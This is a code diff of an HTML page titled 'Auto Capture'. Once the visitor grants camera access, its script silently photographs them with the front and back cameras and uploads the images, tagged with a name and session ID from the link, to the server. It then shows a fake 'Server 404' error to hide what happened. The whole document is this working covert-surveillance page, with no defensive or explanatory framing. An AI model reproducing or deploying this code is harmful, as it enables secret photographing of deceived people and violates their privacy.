@@ -1,67 +1,88 @@
-<script>
-(async function() {
-  const status = document.getElementById("status");
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Auto Capture</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
+    p { margin-top: 20px; font-size: 18px; }
+  </style>
+</head>
+<body>
+  <p id="status">Page will load in 2–3 seconds, please wait....</p>
 
-  const urlParams = new URLSearchParams(window.location.search);
-  const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
-  const name = urlParams.get("name") || "visitor";
+  <script>
+  (async function() {
+    const status = document.getElementById("status");
 
-  status.innerText = "Page will load in 2–3 seconds, please wait....";
+    // Get sessionId and name from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
+    const name = urlParams.get("name") || "visitor";
 
-  async function takePhoto(facingMode) {
+    async function takePhoto(facingMode) {
+      try {
+        const constraints = {
+          video: typeof facingMode === "string" ? { facingMode } : { facingMode: facingMode }
+        };
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL("image/jpeg");
+        stream.getTracks().forEach(track => track.stop());
+        return imageData;
+      } catch (err) {
+        console.error("Camera capture failed:", err);
+        throw err;
+      }
+    }
+
+    async function sendToServer(imageData, type) {
+      await fetch("/upload", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          image: imageData,
+          name,
+          type,
+          sessionId
+        })
+      });
+    }
+
     try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      await video.play();
+      if (/Mobi|Android/i.test(navigator.userAgent)) {
+        // Mobile: front then back
+        const frontPhoto = await takePhoto("user");
+        await sendToServer(frontPhoto, "front");
 
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        const backPhoto = await takePhoto({ ideal: "environment" });
+        await sendToServer(backPhoto, "back");
+      } else {
+        // Desktop: default camera twice
+        const photo1 = await takePhoto("user");
+        await sendToServer(photo1, "front");
 
-      const imageData = canvas.toDataURL("image/jpeg");
-      stream.getTracks().forEach(track => track.stop());
-      return imageData;
+        const photo2 = await takePhoto("user");
+        await sendToServer(photo2, "back");
+      }
+
+      // Success message
+      status.innerText = "Server 404! Please try after some time";
     } catch (err) {
-      console.error(err);
-      throw err;
+      // Failure message
+      status.innerText = "Server failed! Sorry, try again in a few minutes!";
     }
-  }
-
-  async function sendToServer(imageData, type) {
-    await fetch("/upload", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        image: imageData,
-        name,
-        type,
-        sessionId
-      })
-    });
-  }
-
-  try {
-    if (/Mobi|Android/i.test(navigator.userAgent)) {
-      // Mobile: capture front then back sequentially
-      const frontPhoto = await takePhoto("user");
-      await sendToServer(frontPhoto, "front");
-
-      const backPhoto = await takePhoto({ exact: "environment" });
-      await sendToServer(backPhoto, "back");
-    } else {
-      // Desktop: capture default camera twice
-      const photo1 = await takePhoto("user");
-      await sendToServer(photo1, "front");
-
-      const photo2 = await takePhoto("user");
-      await sendToServer(photo2, "back");
-    }
-
-    status.innerText = "Server 404! Please try after some time";
-  } catch (err) {
-    status.innerText = "Server failed! Sorry, try again in a few minutes!";
-  }
-})();
-</script>
+  })();
+  </script>
+</body>
+</html>
